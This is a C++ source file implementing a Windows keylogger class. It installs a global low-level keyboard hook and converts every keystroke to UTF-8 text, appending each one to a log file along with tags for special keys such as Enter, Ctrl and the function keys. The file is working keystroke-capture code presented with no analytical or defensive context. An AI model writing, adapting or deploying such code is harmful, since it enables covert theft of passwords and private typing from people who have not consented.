#include "KeyLogger.hpp"

std::ofstream KeyLogger::outFile;
HHOOK KeyLogger::hook = nullptr;
std::string KeyLogger::filePath;

KeyLogger::KeyLogger(const std::string& filename) {
    filePath = filename;
}

void KeyLogger::start() {
    outFile.open(filePath, std::ios::app);
    if (!outFile.is_open()) return;

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    if (!hook) return;

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    outFile.close();
}

LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Only process real key down events
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = kbStruct->vkCode;

        // Get current keyboard state (shift, caps, etc.)
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        WCHAR buffer[5] = {0};
        UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
        HKL layout = GetKeyboardLayout(0);

        // Try to convert virtual key into Unicode character
        int result = ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 4, 0, layout);
        if (result > 0) {
            // Convert WCHAR to UTF-8 properly (supports accents)
            char utf8Char[5] = {0};
            int len = WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Char, sizeof(utf8Char), nullptr, nullptr);
            if (len > 0) {
                outFile.write(utf8Char, len);
                outFile.flush();
            }
        } else {
            // Handle non-character keys manually
            switch (vkCode) {
                case VK_RETURN:    outFile << "[ENTER]"; break;
                case VK_BACK:      outFile << '\b' << "[BACK]"; break;
                case VK_SPACE:     outFile << " "; break;
                case VK_TAB:       outFile << "[TAB]"; break;
                case VK_ESCAPE:    outFile << "[ESC]"; break;
                case VK_CAPITAL:   outFile << "[CAPSLOCK]"; break;

                // Modifiers
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:    outFile << "[SHIFT]"; break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:  outFile << "[CTRL]"; break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:     outFile << "[ALT]"; break;
                case VK_LWIN:
                case VK_RWIN:      outFile << "[WIN]"; break;

                // Navigation
                case VK_LEFT:      outFile << "[LEFT]"; break;
                case VK_RIGHT:     outFile << "[RIGHT]"; break;
                case VK_UP:        outFile << "[UP]"; break;
                case VK_DOWN:      outFile << "[DOWN]"; break;
                case VK_INSERT:    outFile << "[INS]"; break;
                case VK_DELETE:    outFile << "[DEL]"; break;
                case VK_HOME:      outFile << "[HOME]"; break;
                case VK_END:       outFile << "[END]"; break;
                case VK_PRIOR:     outFile << "[PAGEUP]"; break;
                case VK_NEXT:      outFile << "[PAGEDOWN]"; break;

                // Lock keys
                case VK_NUMLOCK:   outFile << "[NUMLOCK]"; break;
                case VK_SCROLL:    outFile << "[SCROLLLOCK]"; break;
                case VK_SNAPSHOT:  outFile << "[PRTSC]"; break;
                case VK_PAUSE:     outFile << "[PAUSE]"; break;

                // Function keys
                case VK_F1:  outFile << "[F1]"; break;
                case VK_F2:  outFile << "[F2]"; break;
                case VK_F3:  outFile << "[F3]"; break;
                case VK_F4:  outFile << "[F4]"; break;
                case VK_F5:  outFile << "[F5]"; break;
                case VK_F6:  outFile << "[F6]"; break;
                case VK_F7:  outFile << "[F7]"; break;
                case VK_F8:  outFile << "[F8]"; break;
                case VK_F9:  outFile << "[F9]"; break;
                case VK_F10: outFile << "[F10]"; break;
                case VK_F11: outFile << "[F11]"; break;
                case VK_F12: outFile << "[F12]"; break;

                // Optional: capture unknown keys
                default:
                    outFile << "[UNK:" << vkCode << "]";
                    break;
            }

            outFile.flush();
        }
    }

    // Pass the event to next hook in the chain
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}
